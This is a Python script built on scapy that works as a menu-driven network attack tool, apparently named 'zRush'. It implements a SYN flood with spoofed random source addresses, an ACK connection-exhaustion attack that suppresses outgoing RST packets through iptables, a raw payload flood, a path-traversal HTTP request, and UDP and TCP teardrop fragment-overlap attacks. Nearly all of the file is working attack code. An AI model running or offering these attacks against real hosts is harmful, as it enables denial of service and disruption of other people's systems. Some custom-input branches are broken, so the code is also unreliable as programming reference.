from sys import flags
from scapy.all import*
import os
import time
from ftplib import FTP
from threading import Thread
import socket

# sends SYN packet to inputted address and port but does not send ACK packet back to HOSt
def syn_flood(src, dst, dport):
    print("[*] Initiating SYN flood attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    srcIP = RandIP("192.168.1.1/24")
    srcPort = RandShort()
    ip = IP(src = srcIP, dst = dst)
    tcp = TCP(sport = srcPort, dport = dport, flags = "S")
    raw = Raw(b"X"*1024)
    SYN = ip/ tcp/ raw
    print("[*] sending SYN packets...\n")
    i = 1
    try:
        start_time = time.time()
        while(True):
            send(SYN, loop = 0, verbose = 0)
            print(str(i), "SYN packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "SYN packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")

# starts a new TCP connection, receives SYN/ACK, and sends ACK packet back, indefinetly loops this actino
def ACK_attack(src, dst, dport):
    print("[*] Initiating ACK attack to Ip address "+str(dst)+". Press ctrl-c to exit the program.")
    cmd = "sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP"
    os.system(cmd)
    i = 1
    print("[*] sending ACK packets after receiving SYN/ACK from target...")
    try:
        start_time = time.time()
        while(True):
            #syn
            sport = random.randint(1024, 65535)
            ip = IP(src = src, dst = dst)
            SYN = TCP(sport = sport, dport = dport, flags='S', seq = 1000)
            SYNACK=sr1(ip/SYN, verbose = 0)

            #ack
            ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
            send(ip/ACK, verbose = 0)
            print(str(i), "ACK packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "ACK packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")
        os.system("sudo iptables -D OUTPUT -p tcp --tcp-flags RST RST -j DROP")

# sends a very long, no carriage return character string as a TCP packet
def lpacket_raw(src, dst, dport):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((dst,int(dport)))
        i = 1
        start_time = time.time()
        while(True):
            c.send(b"X"*512)
            response = c.recv(4096)
            print(str(i), "packets sent.", end = "\r")
            i+=1
    except KeyboardInterrupt:
        runtime = time.time()-start_time
        print(str(i), "packets sent. Runtime", round(runtime,3) ,"seconds.")
        print("Rate:", round(i/runtime,3), "packets per second.")
        c.close()

# sends forged HTTP request to target address and port
def HTTPhackery(src, dst, dport):
    #syn
    sport = random.randint(1024, 65535)
    ip = IP(src = src, dst = dst)
    SYN = TCP(sport = sport, dport = dport, flags='S')
    SYNACK=sr1(ip/SYN, verbose = 0)

    #ack
    ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    #getStr = 'GET '+ '/htdocs/application.html HTTP/1.1\r\n'+"X"*1024+'Host: '+ dst +"\r\n\r\n"
    getStr = 'GET '+ '/htdocs/application.html/../../ HTTP/1.1\r\n'+'Host: '+ dst +"\r\n\r\n"
    print("HTTP request sent:", getStr)
    reply = sr1(ip/ACK/getStr)
    print(reply)

# teardrop attack through UDP
def UDPteardrop(src, dst, dport):
    print("[*] Select attack options from below:")
    print("    1. small payload (36 bytes), 2 packets, offset = 3x8 bytes")
    print("    2. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
    print("    3. large payload (1300 bytes), 12 packets, offset = 80x8 bytes")
    print("    4. large payload (1300 bytes), 2 packets, offset = 3x8 bytes")
    print("    5. large payload (1300 bytes), 2 packets, offset = 10x8 bytes")
    print("    6. large payload (1300 bytes), looped packets (ctrl-c to send end packet), offset = 10x8 bytes")
    print("    7. custom input")
    x = input("zRush > ")
    print("Using attack",x)
    match x:
        case "1":
            size = 36
            offset = 3
            load1 = "\x00"*size
            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 17)

            size = 4
            offset = 18
            load2 = "x00"*size

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)
            
            send(ip1/load1)
            send(ip2/load2)
        case "2":
            size = 1300
            offset = 80
            load1 = "A"*size
            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 17)

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)

            send(ip1/load1)
            send(ip2/load1)

        case "3":
            size = 1300
            offset = 80
            load1 = "A"*size
            ip = IP(src = src, dst = dst, flags = "MF", proto = 17, frag = 0)

            send(ip/load1)
            for i in range(1, 10):
                ip.frag = offset
                offset = offset + 80
                send(ip/load1)
            ip.frag = offset
            ip.flags = 0
            send(ip/load1)
        case "4":
            size = 1300
            offset = 3
            load1 = "\x00"*size
            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 17)

            size = 4
            offset = 18
            load2 = "x00"*size

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)
            
            send(ip1/load1)
            send(ip2/load2)
        case "5":
            size = 1300
            offset = 10
            load = "A"*size

            ip = IP(src = src, dst = dst, flags = "MF", proto = 17)

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 17, frag = offset)

            send(ip/load)
            send(ip2/load)
        case "6":
            size = 1300
            offset = 80
            load1 = "A"*size
            ip = IP(src = src, dst = dst, flags = "MF", proto = 17, frag = 0)

            send(ip/load1)
            try:
                while(True):
                    ip.frag = offset
                    offset = offset + 80
                    send(ip/load1)
            except KeyboardInterrupt:
                ip.frag = offset
                ip.flags = 0
                send(ip/load1)
        case "7":
            print("[*] enter size of pacekt")
            size = input("zRush > ")
            print("[*] enter number of pacekts")
            num = input("zRush > ")
            print("[*] enter offset of pacekt")
            offset = input("zRush > ")

            load1 = "A"*size
            ip = IP(src = src, dst = dst, flags = "MF", proto = 17, frag = 0)
            send(ip/load1)

            for i in range(1, num-1):
                ip.frag = offset
                offset = offset + 80
                send(ip/load1)

            ip.frag = offset
            ip.flags = 0
            send(ip/load1)

def TCPteardrop(src, dst, dport):
    print("[*] Select attack options from below:")
    print("    1. small payload (36 bytes), 2 packets, offset = 3x8 bytes")
    print("    2. large payload (1300 bytes), 2 packets, offset = 80x8 bytes")
    print("    3. large payload (1300 bytes), 12 packets, offset = 80x8 bytes")
    print("    4. large payload (1300 bytes), 2 packets, offset = 3x8 bytes")
    print("    5. large payload (1300 bytes), 2 packets, offset = 10x8 bytes")
    print("    6. large payload (1300 bytes), looped packets (ctrl-c to send end packet), offset = 10x8 bytes")
    print("    7. custom input")
    x = input("zRush > ")
    print("Using attack",x)
    match x:
        case "1":
            size = 36
            offset = 3
            load1 = "\x00"*size
            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 6)

            size = 4
            offset = 18
            load2 = "x00"*size

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)
            
            send(ip1/load1)
            send(ip2/load2)
        case "2":
            size = 1300
            offset = 80
            load1 = "A"*size
            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 6)

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)

            send(ip1/load1)
            send(ip2/load1)

        case "3":
            size = 1300
            offset = 80
            load1 = "A"*size
            ip = IP(src = src, dst = dst, flags = "MF", proto = 6, frag = 0)

            send(ip/load1)
            for i in range(1, 10):
                ip.frag = offset
                offset = offset + 80
                send(ip/load1)
            ip.frag = offset
            ip.flags = 0
            send(ip/load1)
        case "4":
            size = 1300
            offset = 3
            load1 = "\x00"*size
            ip1 = IP(src = src, dst = dst, flags = "MF", proto = 6)

            size = 4
            offset = 18
            load2 = "x00"*size

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)
            
            send(ip1/load1)
            send(ip2/load2)
        case "5":
            size = 1300
            offset = 10
            load = "A"*size

            ip = IP(src = src, dst = dst, flags = "MF", proto = 6)

            ip2 = IP(src = src, dst = dst, flags = 0, proto = 6, frag = offset)

            send(ip/load)
            send(ip2/load)
        case "6":
            size = 1300
            offset = 80
            load1 = "A"*size
            ip = IP(src = src, dst = dst, flags = "MF", proto = 6, frag = 0)

            send(ip/load1)
            try:
                while(True):
                    ip.frag = offset
                    offset = offset + 80
                    send(ip/load1)
            except KeyboardInterrupt:
                ip.frag = offset
                ip.flags = 0
                send(ip/load1)
        case "7":
            print("[*] enter size of pacekt")
            size = input("zRush > ")
            print("[*] enter number of pacekts")
            num = input("zRush > ")
            print("[*] enter offset of pacekt")
            offset = input("zRush > ")

            load1 = "A"*size
            ip = IP(src = src, dst = dst, flags = "MF", proto = 6, frag = 0)
            send(ip/load1)

            for i in range(1, num-1):
                ip.frag = offset
                offset = offset + 80
                send(ip/load1)

            ip.frag = offset
            ip.flags = 0
            send(ip/load1)